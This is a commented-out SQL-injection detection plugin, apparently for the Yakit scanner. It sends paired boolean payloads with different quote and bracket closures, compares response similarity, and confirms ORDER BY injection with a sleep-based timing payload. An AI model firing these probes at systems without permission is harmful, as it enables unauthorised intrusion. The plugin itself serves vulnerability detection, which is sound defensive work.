//		rand1 := randn(1, 20000)
//		positivePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, rand1, rand1)
//		negativePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, rand1, rand1 + 1)
//	} else {
//		paramType = "字符串"
//		randString := randstr(4)
//		positivePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, randString, randString)
//		negativePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, randString, randstr(5))
//	}
//
//
//	res = originResponse
//	_, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
//
//	p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf(("request positive rsp error: %s"), err))
//		return false
//	}
//
//	_, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
//
//	n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf("response negative rsp error: %v", err))
//		return false
//	}
//
//	_, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
//
//	if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
//		yakit_output("response empty")
//		return false
//	}
//
//
//	opResult := str.CalcSimilarity(bodyOrigin, pBody)
//
//	if opResult < SimilarityRatio {
//		REASON = sprintf(
//			"参数为%v，假定双引号边界，[%v]与原参数结果不相同",
//			paramType,
//			positivePayload,
//		)
//		yakit_output(REASON)
//		return false
//	}
//
//
//	pnResult := str.CalcSimilarity(pBody, nBody)
//
//	if pnResult > SimilarityRatio {
//		reason = sprintf(
//			"参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
//			paramType,
//			positivePayload,
//			negativePayload,
//			pnResult,
//		)
//		yakit_output(reason)
//		return false
//	}
//
//
//	yakit_output(sprintf(
//		"疑似SQL注入：【参数：%v型[%v] 双引号闭合】",
//		paramType,
//		originValue,
//	))
//	yakit_output(sprintf(
//		"测试使用的positive payload为: %v 响应包为: %s", positivePayload, string(pBody)
//	))
//	yakit_output(sprintf(
//		"测试使用的negative payload为: %v 响应包为: %s", negativePayload, string(nBody)
//	))
//
//	// risk.NewRisk(res.Url, risk.title(
//	//     sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),
//	// ), risk.titleVerbose(sprintf("疑似SQL注入：【参数：%v[%v] 双引号闭合】",paramType, originValue)), risk.type("sqlinjection"), risk.payload(negativePayload), risk.parameter(param.Name()), risk.request(n1rsp.RequestRaw), risk.response(n1rsp.ResponseRaw))
//	return true
//}
//
//
///* 测试无闭合类型 */
//func checkType2(param, originValue, originResponse, IsNumeric) {
//	var positivePayload, negativePayload, paramType
//	defer func {
//		err := recover()
//		if err != nil {
//			yakit_output(err.Error())
//		}
//
//	}
//
//
//	if IsNumeric {
//		paramType = "数字"
//		rand1 := randn(1, 20000)
//		positivePayload = sprintf("%v/**/AND/**/%v=%v", originValue, rand1, rand1)
//		negativePayload = sprintf("%v/**/AND/**/%v=%v", originValue, rand1, rand1 + 1)
//	} else {
//		paramType = "字符串"
//		randString := randstr(4)
//		positivePayload = sprintf("%v/**/AND/**/'%v'='%v'", originValue, randString, randString)
//		negativePayload = sprintf("%v/**/AND/**/'%v'='%v'", originValue, randString, randstr(5))
//	}
//
//
//	res = originResponse
//	_, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
//
//	p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf(("request positive rsp error: %s"), err))
//		return false
//	}
//
//	_, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
//
//	n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf("response negative rsp error: %v", err))
//		return false
//	}
//
//	_, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
//
//	if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
//		yakit_output("response empty")
//		return false
//	}
//
//
//	opResult := str.CalcSimilarity(bodyOrigin, pBody)
//
//	if opResult < SimilarityRatio {
//		REASON = sprintf(
//			"参数为%v，假定无边界，[%v]与原参数结果不相同",
//			paramType,
//			positivePayload,
//		)
//		yakit_output(REASON)
//		return false
//	}
//
//
//	pnResult := str.CalcSimilarity(pBody, nBody)
//
//	if pnResult > SimilarityRatio {
//		reason = sprintf(
//			"参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
//			paramType,
//			positivePayload,
//			negativePayload,
//			pnResult,
//		)
//		yakit_output(reason)
//		return false
//	}
//
//
//	yakit_output(sprintf(
//		"疑似SQL注入：【参数：%v型[%v] 无边界闭合】",
//		paramType,
//		originValue,
//	))
//	yakit_output(sprintf(
//		"测试使用的positive payload为: %v 响应包为: %s", positivePayload, string(pBody)
//	))
//	yakit_output(sprintf(
//		"测试使用的negative payload为: %v 响应包为: %s", negativePayload, string(nBody)
//	))
//	// risk.NewRisk(res.Url, risk.title(
//	//     sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),
//	// ), risk.titleVerbose(sprintf("疑似SQL注入：【参数：%v[%v] 无边界闭合】",paramType, originValue)), risk.type("sqlinjection"), risk.payload(negativePayload), risk.parameter(param.Name()), risk.request(n1rsp.RequestRaw), risk.response(n1rsp.ResponseRaw))
//	return true
//}
//
///* 测试 )' 闭合类型 */
//func checkType3(param, originValue, originResponse, IsNumeric) {
//	var positivePayload, negativePayload, paramType
//	defer func {
//		err := recover()
//		if err != nil {
//			yakit_output(err.Error())
//		}
//		return false
//	}
//
//	if IsNumeric {
//		paramType = "数字"
//		rand1 := randn(1, 20000)
//		positivePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, rand1, rand1)
//		negativePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, rand1, rand1 + 1)
//	} else {
//		paramType = "字符串"
//		randString := randstr(4)
//		positivePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, randString, randString)
//		negativePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, randString, randstr(5))
//	}
//
//
//	res = originResponse
//	_, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
//
//	p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf(("request positive rsp error: %s"), err))
//		return false
//	}
//
//	_, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
//
//	n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf("response negative rsp error: %v", err))
//		return false
//	}
//
//	_, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
//
//	if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
//		yakit_output("response empty")
//		return false
//	}
//
//
//	opResult := str.CalcSimilarity(bodyOrigin, pBody)
//
//	if opResult < SimilarityRatio {
//		REASON = sprintf(
//			"参数为%v，假定括号单引号边界，[%v]与原参数结果不相同",
//			paramType,
//			positivePayload,
//		)
//		yakit_output(REASON)
//		return false
//	}
//
//
//	pnResult := str.CalcSimilarity(pBody, nBody)
//
//	if pnResult > SimilarityRatio {
//		reason = sprintf(
//			"参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
//			paramType,
//			positivePayload,
//			negativePayload,
//			pnResult,
//		)
//		yakit_output(reason)
//		return false
//	}
//
//
//	yakit_output(sprintf(
//		"疑似SQL注入：【参数：%v型[%v] 括号单引号闭合】",
//		paramType,
//		originValue,
//	))
//	yakit_output(sprintf(
//		"测试使用的positive payload为: %v 响应包为: %s", positivePayload, string(pBody)
//	))
//	yakit_output(sprintf(
//		"测试使用的negative payload为: %v 响应包为: %s", negativePayload, string(nBody)
//	))
//
//	//yakit_output(http.dump(n1rsp.ResponseRaw))
//	// risk.NewRisk(res.Url, risk.title(
//	//     sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),
//	// ), risk.titleVerbose(sprintf("疑似SQL注入：【参数：%v[%v] 括号单引号闭合】",paramType, originValue)), risk.type("sqlinjection"), risk.payload(negativePayload), risk.parameter(param.Name()), risk.request(n1rsp.RequestRaw), risk.response(n1rsp.ResponseRaw))
//	return true
//}
//
///* 测试 )" 闭合类型 */
//func checkType4(param, originValue, originResponse, IsNumeric) {
//	var positivePayload, negativePayload, paramType
//	defer func {
//		err := recover()
//		if err != nil {
//			yakit_output(err.Error())
//		}
//
//	}
//
//	if IsNumeric {
//		paramType = "数字"
//		rand1 := randn(1, 20000)
//		positivePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, rand1, rand1)
//		negativePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, rand1, rand1 + 1)
//	} else {
//		paramType = "字符串"
//		randString := randstr(4)
//		positivePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, randString, randString)
//		negativePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, randString, randstr(5))
//	}
//
//
//	res = originResponse
//	_, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
//
//	p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf(("request positive rsp error: %s"), err))
//		return false
//	}
//
//	_, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
//
//	n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf("response negative rsp error: %v", err))
//		return false
//	}
//
//	_, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
//
//	if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
//		yakit_output("response empty")
//		return false
//	}
//
//
//	opResult := str.CalcSimilarity(bodyOrigin, pBody)
//
//	if opResult < SimilarityRatio {
//		REASON = sprintf(
//			"参数为%v，假定括号双引号边界，[%v]与原参数结果不相同",
//			paramType,
//			positivePayload,
//		)
//		yakit_output(REASON)
//		return false
//	}
//
//
//	pnResult := str.CalcSimilarity(pBody, nBody)
//
//	if pnResult > SimilarityRatio {
//		reason = sprintf(
//			"参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
//			paramType,
//			positivePayload,
//			negativePayload,
//			pnResult,
//		)
//		yakit_output(reason)
//		return false
//	}
//
//
//	yakit_output(sprintf(
//		"疑似SQL注入：【参数：%v型[%v] 括号双引号闭合】",
//		paramType,
//		originValue,
//	))
//	yakit_output(sprintf(
//		"测试使用的positive payload为: %v 响应包为: %s", positivePayload, string(pBody)
//	))
//	yakit_output(sprintf(
//		"测试使用的negative payload为: %v 响应包为: %s", negativePayload, string(nBody)
//	))
//
//	// risk.NewRisk(res.Url, risk.title(
//	//     sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),
//	// ), risk.titleVerbose(sprintf("疑似SQL注入：【参数：%v[%v] 括号双引号闭合】",paramType, originValue)), risk.type("sqlinjection"), risk.payload(negativePayload), risk.parameter(param.Name()), risk.request(n1rsp.RequestRaw), risk.response(n1rsp.ResponseRaw))
//	return true
//}
//
//
///* 测试order by无闭合类型 */
//func checkTypeOrderBy(param, originValue, originResponse, IsNumeric) {
//	var positivePayload, negativePayload, paramType
//	defer func {
//		err := recover()
//		if err != nil {
//			yakit_output(err.Error())
//		}
//
//	}
//
//
//	if IsNumeric {
//		paramType = "数字"
//		rand1 = randn(1, 20000)
//		positivePayload = "(select/**/1/**/regexp/**/if(1=1,1,0x00))"
//		negativePayload = "(select/**/1/**/regexp/**/if(1=2,1,0x00))"
//	} else {
//		paramType = "字符串"
//		randString := randstr(4)
//		positivePayload = "(select/**/1/**/regexp/**/if(1=1,1,0x00))"
//		negativePayload = "(select/**/1/**/regexp/**/if(1=2,1,0x00))"
//	}
//
//
//	res = originResponse
//	_, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
//
//	p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf(("request positive rsp error: %s"), err))
//		return false
//	}
//
//	_, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
//
//	n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf("response negative rsp error: %v", err))
//		return false
//	}
//
//	_, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
//
//	if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
//		yakit_output("response empty")
//		return false
//	}
//
//
//	opResult := str.CalcSimilarity(bodyOrigin, pBody)
//
//	if opResult < SimilarityRatio {
//		REASON = sprintf(
//			"参数为%v，假定ORDER BY无边界，[%v]与原参数结果不相同",
//			paramType,
//			positivePayload,
//		)
//		yakit_output(REASON)
//		return false
//	}
//
//
//	pnResult := str.CalcSimilarity(pBody, nBody)
//
//	if pnResult > SimilarityRatio {
//		reason = sprintf(
//			"参数为%v，无边界ORDER BY注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
//			paramType,
//			positivePayload,
//			negativePayload,
//			pnResult,
//		)
//		yakit_output(reason)
//		return false
//	}
//
//
//	yakit_output(sprintf(
//		"疑似SQL注入：【参数：%v型[%v] ORDER BY无边界闭合】",
//		paramType,
//		originValue,
//	))
//	yakit_output(sprintf(
//		"测试使用的positive payload为: %v 响应包为: %s", positivePayload, string(pBody)
//	))
//	yakit_output(sprintf(
//		"测试使用的negative payload为: %v 响应包为: %s", negativePayload, string(nBody)
//	))
//
//	// risk.NewRisk(
//	//     res.Url,
//	//     risk.severity("critical"),
//	//     risk.title(sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),),
//	//     risk.titleVerbose(sprintf("疑似SQL注入：【参数：%v[%v] ORDER BY无边界闭合】",paramType, originValue)),
//	//     risk.type("sqlinjection"),
//	//     risk.request(n1rsp.RequestRaw),
//	//     risk.response(n1rsp.ResponseRaw),
//	//     risk.payload(negativePayload),
//	//     risk.parameter(param.Name()),
//	// )
//
//	confirmPayload = sprintf("IF(1=1,%v,%v)", "sleep(3)", originValue)
//	result, err = param.Fuzz(confirmPayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
//		fuzz.WithTimeOut(30))
//	if err != nil {
//		return false
//	}
//
//	if result.ServerDurationMs > 2500 {
//		risk.NewRisk(
//			result.Url,
//			risk.severity("critical"),
//			risk.title(str.f("ORDER BY SQL Injection: [%v:%v]", param.Name(), param.Value())),
//			risk.titleVerbose(str.f(
//				"疑似存在ORDER BY SQL 注入: [参数名:%v 值:%v]",
//				param.Name(),
//				param.Value(),
//			)),
//			risk.type("sqlinjection"),
//		risk.request(result.RequestRaw),
//			risk.response(result.ResponseRaw),
//			risk.payload(confirmPayload),
//			risk.parameter(param.Name()),
//	)
//		yakit_output(str.f(
//			"存在ORDER BY SQL 注入: [参数名:%v 值:%v]",
//			param.Name(),
//			param.Value(),
//		))
//		return true
//	}
//
//	return true//尽管没检测出直接延时，但还是检测到页面变化，可能是ORDER BY注入 需要人工判断
//	//尽管没检测出直接延时，但还是检测到页面变化，可能是ORDER BY注入 需要人工判断
//}
